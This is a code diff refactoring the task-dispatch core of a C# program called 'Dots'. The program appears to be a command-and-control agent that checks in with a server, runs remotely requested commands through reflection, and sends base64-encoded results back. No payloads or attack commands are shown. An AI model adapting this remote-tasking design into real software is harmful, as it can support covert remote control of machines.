@@ -11,10 +11,11 @@ namespace Dots
     {
         private static TaskManager _taskManager;
         private static CancellationTokenSource _tokenSource;
-        private static DotsProperties _dotsProperty = new DotsProperties();
+        private static readonly DotsProperties _dotsProperty = new DotsProperties();
 
         public static void Main(string[] args)
         {
+            LoadDotsCommands();
             _taskManager = new TaskManager(args[0]);
             _taskManager.Init();
             _taskManager.InitialCheckin(args[1]);
@@ -37,42 +38,71 @@ namespace Dots
             _tokenSource.Cancel();
         }
 
-        private static void ExecuteTask(TaskRequest task)
+        private static void LoadDotsCommands()
         {
-            foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
+            Assembly assembly = Assembly.GetExecutingAssembly();
+
+            foreach (var type in assembly.GetTypes())
             {
-                foreach (var type in assembly.GetTypes())
+                if (type.IsSubclassOf(typeof(DotsCommand)))
                 {
-                    if (type.IsSubclassOf(typeof(DotsCommand)))
-                    {
-                        DotsCommand command = (DotsCommand)Activator.CreateInstance(type);
-                        if (command.Name == task.Method)
-                        {
-                            try
-                            {
-                                command.Execute(task, _dotsProperty);
-                            } catch (Exception ex)
-                            {
-                                TaskError failedToExecuteError = new TaskError
-                                {
-                                    JSONRPC = "2.0",
-                                    Error = new TaskErrorDetails
-                                    {
-                                        Code = -32000,
-                                        Message = Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.Message)),
-                                    },
-                                    Id = task.Id
-                                };
-                                _taskManager.SendError(failedToExecuteError);
-                                return;
-                            }
-                            _taskManager.SendResult(command.Result);
-                            return;
-                        }
-                    }
+                    DotsCommand command = (DotsCommand) Activator.CreateInstance(type);
+                    command.DotsProperty = _dotsProperty;
+                    _dotsProperty.Commands.Add(command);
                 }
             }
+        }
 
+        private static void ExecuteTask(TaskRequest task)
+        {
+            foreach (Object command in _dotsProperty.Commands)
+            {
+                try
+                {
+                    Type commandType = command.GetType();
+                    string name = (string)commandType.GetProperty("Name").GetValue(command);
+                    MethodInfo executeMethod = commandType.GetMethod("Execute");
+
+                    if (name == task.Method)
+                    {
+                        object result = executeMethod.Invoke(command, new object[] { task.Params });
+                        if (result is byte[] bytes)
+                        {
+                            result = Convert.ToBase64String(bytes);
+                        }
+                        else if (result != null)
+                        {
+                            result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result.ToString()));
+                        } else
+                        {
+                            result = "";
+                        }
+                        TaskResult Result = new TaskResult
+                        {
+                            JSONRPC = task.JSONRPC,
+                            Result = (string)result,
+                            Id = task.Id
+                        };
+                        _taskManager.SendResult(Result);
+                        return;
+                    }
+                } catch (Exception ex)
+                {
+
+                    TaskError failedToExecuteError = new TaskError
+                    {
+                        JSONRPC = "2.0",
+                        Error = new TaskErrorDetails
+                        {
+                            Code = -32000,
+                            Message = Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.ToString())),
+                        },
+                        Id = task.Id
+                    };
+                    _taskManager.SendError(failedToExecuteError);
+                    return;
+                }
+            }
 
             TaskError methodNotSupportedError = new TaskError
             {
